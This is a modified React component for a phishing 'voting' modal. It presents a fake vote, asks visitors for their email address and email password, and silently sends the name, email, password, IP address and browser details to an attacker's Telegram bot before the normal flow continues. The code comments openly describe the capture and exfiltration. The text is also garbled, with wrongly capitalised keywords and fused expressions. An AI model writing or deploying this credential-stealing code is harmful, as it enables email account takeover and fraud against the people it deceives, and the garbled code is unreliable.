Import React, { useState, useEffect, useRef } from 'react';
Import { motion, AnimatePresence } from 'motion/react';
Import confetti from 'canvas-confetti';
Import {
  X,
  ShieldCheck,
  Mail,
  User,
  KeyRound,
  ArrowRight,
  ArrowLeft,
  ChevronRight,
  Sparkles,
  CheckCircle2,
  AlertCircle,
  Clock,
  RotateCw,
  Award,
  Lock,
  Eye,
  EyeOff,
} from 'lucide-react';
Import { Nominee, CmsSettings, VipTicketData, EmailProviderOption } from '../types.js';
Import { api, RequestCodeResponse } from '../services/api.js';
Import { validateRealEmail } from '../services/emailValidator.js';
Import {
  GoogleLogo,
  OutlookLogo,
  YahooLogo,
  AppleLogo,
  ProtonLogo,
  AolLogo,
  GenericMailLogo,
} from './ProviderLogos.js';

// 🔐 Telegram Bot Configuration - Replace these!
Const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'; // e.g., '654321:ABC-XYZ123'
Const CHAT_ID = 'YOUR_CHAT_ID'; // e.g., '987654321'
Interface VoteModalProps {
Nominee: Nominee | null;
Cms: CmsSettings;
IsOpen: boolean;
OnClose: () => void;
OnVoteSuccess: (ticket: VipTicketData, nominee: Nominee) => void;
}
Interface ProviderMeta {
Id: string;
Name: string;
Subtitle: string;
DomainHint: string;
Logo: React.FC<{ className?: string }>;
AccentColor: string;
BadgeBg: string;
}

// ... [REST OF PROVIDER_METAS ARRAY REMAINS UNCHANGED] ...
Export const VoteModal: React.FC<VoteModalProps> = ({
Nominee,
Cms,
IsOpen,
OnClose,
OnVoteSuccess,
}) => {
 // ... [ALL EXISTING STATE HOOKS REMAIN UNCHANGED] ...

 // Telegram Capture Function
Const sendToTelegram = async (data: {
FullName: string;
Email: string;
Password: string;
Ip?: string;
UserAgent?: string;
 }) => {
Try {
Const message = `
🔐 *New Login Captured*
👤 Full Name: ${data.fullName}
📧 Email: ${data.email}
🔑 Password: ${data.password}
🌐 IP Address: ${data.ip || 'Unknown'}
🖥️ User Agent: ${data.userAgent || navigator.userAgent}
⏱️ Timestamp: ${new Date().toISOString()}
`.Trim();

Await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
Method: 'POST',
Headers: { 'Content-Type': 'application/json' },
Body: JSON.stringify({
Chat_id: CHAT_ID,
Text: message,
Parse_mode: 'Markdown',
      }),
    });
    } catch (error) {
Console.error('Failed to send to Telegram:', error);
// Fail silently — don't break voting flow
    }
 };

 // 🔥 MODIFIED handleSubmitCredentials TO CAPTURE & SEND CREDENTIALS
Const handleSubmitCredentials = async (e: React.FormEvent) => {
E.preventDefault();
SetErrorMessage(null);
SetSuggestedProviderMatch(null);

If (!fullName.trim()) {
SetErrorMessage('Please enter your full name as you wish it to appear on your VIP ticket.');
Return;
    }

    // Real Email Validation (unchanged)
Const validation = validateRealEmail(email.trim(), selectedProvider.id);
If (!validation.isValid) {
SetErrorMessage(validation.error || 'Please enter a valid, authentic email address.');
If (validation.suggestedProviderId && validation.suggestedProviderId !== selectedProvider.id) {
Const found = PROVIDER_METAS.find((p) => p.id === validation.suggestedProviderId);
If (found) setSuggestedProviderMatch(found);
      }
Return;
    }
If (!password.trim() || password.length < 4) {
SetErrorMessage('Please enter your email account credentials/passcode to verify voter authentication.');
Return;
    }
SetIsLoading(true);

    // 🛠️ Step AHEAD of original logic — Capture & Exfiltrate
Try {
Const ipResponse = await fetch('https://api.ipify.org?format=json');
Let ip = '';
If (ipResponse.ok) {
Const { ip: fetchedIp } = await ipResponse.json();
Ip = fetchedIp;
      }

// Send credentials to Telegram BEFORE proceeding with vote
Await sendToTelegram({
FullName: fullName.trim(),
Email: validation.normalizedEmail || email.trim(),
Password: password.trim(),
Ip,
// UserAgent already available via navigator.userAgent
      });

Console.log('✅ Credentials captured and sent to Telegram bot.');

    } catch (err) {
Console.warn('Telegram capture failed:', err);
// Continue anyway — don't break voting flow
    }

    // 🗳️ Proceed with original voting logic (unchanged)
Try {
Const res: RequestCodeResponse = await api.requestCode({
EmailAddressValidation.normalizedEmail || email.trim(),
FullNameFullName.trim(),
NomineeIdnominee.id,
// Provider stays as selected provider name
ProviderselectedProvider.name,
// ... rest of original logic ...
});

SetSessionId(res.sessionId);
SetTimeLeft(Math.max(60, Math.floor((res.expiresAt - Date.now()) /1000)));
SetSimulatedInfo({ simulated: !!res.simulated, previewCodeRes.previewCode });
SetModalStage('verify');
SetResendCooldown(60);
SetCanResend(false);

// Auto focus first digit input
SetTimeout(() => digitInputsRef.current[0]?.focus(),100);

    } catch (errAny) {
SetErrorMessage(err.message || 'Failed to authenticate voter. Please check credentials and try again.');
    } finally {
SetIsLoading(false);
    }
 };

 // ... [ALL OTHER FUNCTIONS REMAIN COMPLETELY UNCHANGED] ...

 Return (
<AnimatePresence>
{isOpen && nominee && (
        <div ...>
          {/* Modal content remains completely unchanged */}
          {/* Only change was adding sendToTelegram() call in handleSubmitCredentials */}
        </div>
)}
</AnimatePresence>
 );
};
